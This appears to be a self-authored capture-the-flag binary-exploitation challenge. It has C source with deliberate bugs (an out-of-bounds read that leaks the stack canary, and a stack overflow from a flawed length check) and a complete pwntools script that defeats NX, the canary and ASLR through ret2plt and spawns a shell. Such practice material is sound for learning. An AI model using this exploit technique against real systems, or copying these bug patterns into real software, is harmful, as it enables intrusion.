# custom challenge
i have just finished writing the challenge, it is 3:09 am for me at the moment, and i think i am going
to die. I have created a neat little pwnable that is pretty simple so it shouldnt be that difficult
to figure out. I tried to make things as stable and not guessy as possible so i hope i succeeded in that.
anyways, here are the exploitable vulns:

Protections:
NX
CANARY
ASLR

1. OOB read       - leak stack canary
2. Stack Overflow - insecure bounds checking
3. ret2plt        - ASLR bypass

and thats it i hope you enjoy :)



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
// -no-pie
// ASLR on ; NX on ; CANARY on
void id_index() {
    long id[]={0};
    int index;
    printf("What index is your id?: ");
    scanf("%d", &index);
    printf("%p", id[index]);
}
void id_update() {
    puts("Feature is under maintenence!");
}
void intro() {
    int len;
    char src[256];
    printf("Enter length of your id (MAX : 256): ");
    scanf("%d", &len);
    printf("Enter your id: ");
    read(0,src,len);
    if (strlen(src)>len) {
        puts("Too large!");
        exit(1);
    }
}
void menu() {
    int op;
    while(1) {
        printf("[1] intro\n[2] get id\n[3] update id\nEnter: ");
        scanf("%d", &op);
        switch (op) {
            case 1:
                intro();
                break;
            case 2:
                id_index();
                break;
            case 3:
                id_update();
                break;
        }
    }
}
int main() {
    menu();
    return 0;
}
__attribute__((constructor))
void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}




#!/usr/bin/env python3
from pwn import *
context(arch='amd64',os='linux')
p=process('./bof',env={'LD_PRELOAD':'./libc.so.6'})
s=lambda x,r="":(p.recvuntil(r) and p.sendline(str(x)) if r else p.sendline(str(x)))
s(2,r="Enter:")
s(1)

### ret2plt
puts_plt=0x00401030             # binary.plt['puts']
puts_got=0x00404018             # binary.got['puts']
puts_offset=0x00076cd0          # libc.sym['puts']
pop_rdi=p64(0x0000000000401423)
menu_addr=p64(0x004012e6)       # binary.sym['menu']

system=0x0004a120
bin_sh=0x0018c966

canary=int(p.recvline().split(b":")[1].split(b"[1]")[0], 16)
log.info("Leaked stack canary: %s"%hex(canary))
canary_offset=264
payload=b"A"*canary_offset
payload+=p64(canary)

payload+=b"A"*8     # padding, QWORD after canary
payload+=pop_rdi
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=menu_addr

s(1,r="Enter:")
s(1000,r="256):")
p.sendline(payload)
base=int.from_bytes(p.recvline().split(b": ")[1].strip(b'\n'),"little") -puts_offset
#print(base)
log.info("Leaked libc base address: %s"%hex(base))

shell=b"A"*canary_offset
shell+=p64(canary)
shell+=b"A"*8
shell+=pop_rdi
shell+=p64(bin_sh+base)
shell+=p64(system+base)



s(1,r="Enter:")
s(1000,r="256):")
p.sendline(shell)


p.interactive()
